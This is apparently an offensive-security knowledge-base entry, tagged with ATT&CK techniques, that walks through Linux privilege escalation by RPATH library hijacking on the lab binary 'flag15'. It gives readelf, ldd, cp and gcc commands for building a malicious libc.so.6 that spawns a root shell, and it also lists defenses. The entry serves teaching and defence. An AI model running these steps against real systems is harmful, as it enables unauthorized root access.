---
id: b50bca34-f027-4272-a53b-0723144bb608
name: Linux-Privilege-Escalation-via-Shared-Library-RPATH-Hijacking
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:19.418450+00:00'
updated_at: '2023-04-10T20:34:31.002051+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Hijack Execution Flow|T1574 - Hijack Execution Flow]]'
sub_techniques:
  - >-
    [[sub-techniques/Executable Installer File Permissions Weakness|T1574.005 -
    Executable Installer File Permissions Weakness]]
tags:
  - '[[tags/Linux - Privilege Escalation]]'
  - '[[tags/RPATH]]'
  - '[[tags/Shared Library]]'
commands:
  - '[[commands/readelf-list-needed-libraries-and-rpath]]'
  - '[[commands/ldd-list-dynamic-dependencies]]'
  - '[[commands/cp-copy-libc-to-temp-dir]]'
  - '[[commands/ls-list-temp-dir-files]]'
  - '[[commands/gcc-compile-rpath-exploit]]'
platforms:
  - Linux
tools: []
validated: true
---

# Linux-Privilege-Escalation-via-Shared-Library-RPATH-Hijacking

## Summary

This procedure demonstrates privilege escalation on a Linux system by exploiting a binary's RPATH configuration to load a malicious shared library from a writable directory. By replacing the legitimate libc.so.6 in the RPATH-specified path with a modified version containing shell-spawning code, an attacker can hijack execution flow and gain elevated privileges when the binary runs as a higher-privileged user.

## Description

Shared libraries on Linux allow code reuse, and RPATH defines the search paths for loading these libraries at runtime. If a binary's RPATH includes a user-writable directory (e.g., /var/tmp/flag15), an attacker with write access can place a malicious library there. When the binary executes, it loads the attacker's library instead of the system one, executing arbitrary code with the binary's privileges. This technique targets binaries like setuid programs or services running as root. In this scenario, the vulnerable binary 'flag15' has RPATH set to /var/tmp/flag15 and depends on libc.so.6. The attacker copies and modifies libc.so.6 to override __libc_start_main, spawning a root shell. This is effective in environments with weak library path controls and writable temp directories.

## Requirements

1. Low-privileged shell access on the target Linux system.
2. Write permissions to the RPATH directory (e.g., /var/tmp/flag15).
3. Access to the vulnerable binary (e.g., flag15) and ability to execute it.
4. GCC compiler installed for building the malicious library.
5. Knowledge of the binary's dependencies (identifiable via readelf or ldd).

## Defense

- Audit binaries for insecure RPATH settings using tools like checksec or patchelf; remove or harden RPATH to system paths only.
- Restrict write access to directories in RPATH (e.g., chmod 755 /var/tmp).
- Use SELinux or AppArmor to confine library loading and execution.
- Monitor for unexpected library loads via auditd or sysdig, and log file changes in temp directories.
- Regularly scan for modified shared libraries with integrity tools like AIDE.

## Objectives

1. Identify vulnerable binaries with writable RPATH directories.
2. Create and deploy a malicious shared library to hijack execution.
3. Achieve privilege escalation to root or service account privileges.
4. Maintain persistence through automated execution if the binary runs periodically.

## Instructions

### Step 1: Identify Binary Dependencies and RPATH

**Context**: Examine the target binary to confirm its shared library dependencies and RPATH. This reveals if a writable directory is in the load path, enabling library hijacking.

**Command** ([[commands/readelf-list-needed-libraries-and-rpath]]):
```bash
readelf -d $_BINARY | egrep "NEEDED|RPATH"
```

> The readelf command displays the dynamic section of the ELF binary, filtering for needed libraries (NEEDED) and runtime paths (RPATH). This step confirms dependencies like libc.so.6 and identifies the hijackable path.

**Command** ([[commands/ldd-list-dynamic-dependencies]]):
```bash
ldd $_BINARY
```

> The ldd command lists resolved library paths at runtime. Compare outputs from readelf and ldd to verify the current load order and confirm the RPATH directory is writable.

**Expected Output**: For a vulnerable binary like flag15:
```
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```

### Step 2: Prepare the RPATH Directory

**Context**: Ensure the target directory exists and is writable, then copy the legitimate library to it as a base for modification.

**Command** ([[commands/ls-list-temp-dir-files]]):
```bash
ls $_RPATH_DIR
```

> List contents of the RPATH directory to verify writability and check for existing files.

**Command** ([[commands/cp-copy-libc-to-temp-dir]]):
```bash
cp /lib/i386-linux-gnu/libc.so.6 $_RPATH_DIR/
```

> Copy the system libc.so.6 to the RPATH directory. This serves as the base; it will be overwritten with the malicious version later.

**Expected Output**: No errors on copy; subsequent ldd on the binary should show loading from the new path:
```
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
```

### Step 3: Create and Compile the Malicious Library

**Context**: Write exploit code to override a key function like __libc_start_main, then compile it into a shared library mimicking libc.so.6. A version script (version file) is needed to control exported symbols; create it with basic libc exports if not provided.

First, create the exploit source file (exploit.c) using the code below, then compile.

**Code** ([[codes/C-Exploit-for-Libc-Start-Main-Override]]):

> This C code overrides __libc_start_main to drop privileges to the effective UID and spawn a shell before calling the original main, ensuring execution with elevated privileges.

**Command** ([[commands/gcc-compile-rpath-exploit]]):
```bash
gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic $_EXPLOIT_C -o $_RPATH_DIR/libc.so.6
```

> Compile the exploit into a shared library, replacing the copied libc.so.6. The -fPIC flag ensures position-independent code; --version-script limits symbols to match libc expectations.

**Expected Output**: Successful compilation with no errors; the new libc.so.6 in $_RPATH_DIR should be executable.

### Step 4: Trigger Execution and Escalate Privileges

**Context**: Run the vulnerable binary to load the malicious library, spawning the shell.

Execute the binary:
```bash
./$_BINARY
```

> If the binary is setuid root, this triggers the override, dropping a root shell.

**Expected Output**: A new /bin/sh shell prompt with elevated privileges (id shows uid=0(root)).

**Success Indicators**:
- ldd shows library loaded from RPATH directory.
- No linker errors on binary execution.
- Shell spawns with higher privileges (e.g., whoami returns root).
